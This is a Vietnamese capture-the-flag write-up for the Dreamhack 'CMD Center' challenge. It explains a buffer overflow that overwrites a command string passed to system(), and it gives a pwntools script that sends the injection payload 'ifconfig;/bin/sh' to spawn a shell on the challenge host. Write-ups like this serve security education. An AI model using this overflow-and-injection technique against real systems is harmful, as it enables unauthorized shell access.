# Challenge: CMD Center

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/cmd_center_chall/cmd_center)
- Chương trình thực thi như sau:
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-130h] BYREF
  char s1[10]; // [rsp+20h] [rbp-110h] BYREF
  __int16 v5; // [rsp+2Ah] [rbp-106h]
  int v6; // [rsp+2Ch] [rbp-104h]
  char v7[240]; // [rsp+30h] [rbp-100h] BYREF
  _QWORD v8[2]; // [rsp+120h] [rbp-10h] BYREF

  v8[1] = __readfsqword(40u);
  strcpy(s1, "ifconfig");
  s1[9] = 0;
  v5 = 0;
  v6 = 0;
  memset(v7, 0, sizeof(v7));
  init(v8, argv, v7);
  printf("Center name: ");
  read(0, buf, 100uLL);
  if ( !strncmp(s1, "ifconfig", 8uLL) )
    system(s1);
  else
    puts("Something is wrong!");
  exit(0);
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Full RELRO
+ Stack:      No canary found
+ NX:         NX enabled
+ PIE:        PIE enabled
+ Stripped:   No
```

## Giải pháp
- Nhìn vào read() ta thấy có thể Buffer Overflow chương trình, nhưng vấn đề ở đây khi debug chương trình offset tới ret address không đủ để overwrite. Offset thực tế phải 0x148 = 328bytes.
```
pwndbg> tel
00:0000│ rsi rsp 0x7fffffffdab0 ◂— 'AAAAAAAA\n'
01:0008│-128     0x7fffffffdab8 ◂— 0xa /* '\n' */
02:0010│-120     0x7fffffffdac0 ◂— 0x37f
03:0018│-118     0x7fffffffdac8 ◂— 0x7112d005
04:0020│-110     0x7fffffffdad0 ◂— 'ifconfig'
05:0028│-108     0x7fffffffdad8 ◂— 0
... ↓            2 skipped
pwndbg>
08:0040│-0f0 0x7fffffffdaf0 ◂— 0
... ↓     7 skipped
pwndbg>
10:0080│-0b0 0x7fffffffdb30 ◂— 0
... ↓     7 skipped
pwndbg>
18:00c0│-070 0x7fffffffdb70 ◂— 0
... ↓     7 skipped
pwndbg>
20:0100│-030 0x7fffffffdbb0 ◂— 0
... ↓        4 skipped
25:0128│-008 0x7fffffffdbd8 ◂— 0x3be8088bc0b86d00
26:0130│ rbp 0x7fffffffdbe0 —▸ 0x7fffffffdcf8 —▸ 0x7fffffffdfb0 ◂— '/home/haiwh/CTF/dreamhack/cmd_center/cmd_center'
27:0138│+008 0x7fffffffdbe8 —▸ 0x7ffff7de7f77 (__libc_start_call_main+119) ◂— mov edi, eax
pwndbg>
28:0140│+010 0x7fffffffdbf0 —▸ 0x7ffff7fc6000 ◂— 0x3010102464c457f
29:0148│+018 0x7fffffffdbf8 —▸ 0x5555554008ad (main) ◂— push rbp
2a:0150│+020 0x7fffffffdc00 ◂— 0x1ffffdce0
2b:0158│+028 0x7fffffffdc08 —▸ 0x7fffffffdcf8 —▸ 0x7fffffffdfb0 ◂— '/home/haiwh/CTF/dreamhack/cmd_center/cmd_center'
2c:0160│+030 0x7fffffffdc10 ◂— 0
2d:0168│+038 0x7fffffffdc18 ◂— 0x9b5fdac5355fcbdb
2e:0170│+040 0x7fffffffdc20 ◂— 1
2f:0178│+048 0x7fffffffdc28 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2f0 —▸ 0x555555400000 ◂— jg 0x555555400047
```
- Do đó, hướng giải quyết lúc này là overwrite địa chỉ so sánh với s1 của chương trình,  đó là **0x7fffffffdad0** lúc này ta overwrite địa chỉ thành 8 bytes cần so sánh + "/bin/sh" thì khi đó lệnh system() sẽ thực thi cả 2 tham số.
> Overwrite địa chỉ chứa biến so sánh với s1 và lấy shell.

## Quá trình
- Ta thấy rằng offset từ buf tới địa chỉ là 0x130 - 0x110 = 0x20 = 32bytes. Do đó, đẩy 32 bytes rác + "ifconfig" + "/bin/sh"
- Nhưng lưu ý rằng, lệnh system sẽ thực thi tham số tiếp theo sau ";" nên khi đẩy "/bin/sh" phải thêm ";" vào trước nó. 
```
payload = flat(
    b'A'*8*4,
    b'ifconfig;/bin/sh',
    )
```
- Chương trình sẽ thực thi system("ifconfig") và tiếp theo thực thi system("/bin/sh").

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('cmd_center', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+152

        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 19099)
else:
    p = process([exe.path])
GDB()

payload = flat(
    b'A'*8*4,
    b'ifconfig;/bin/sh',
    )
sla(b'name: ', payload)

p.interactive()
```
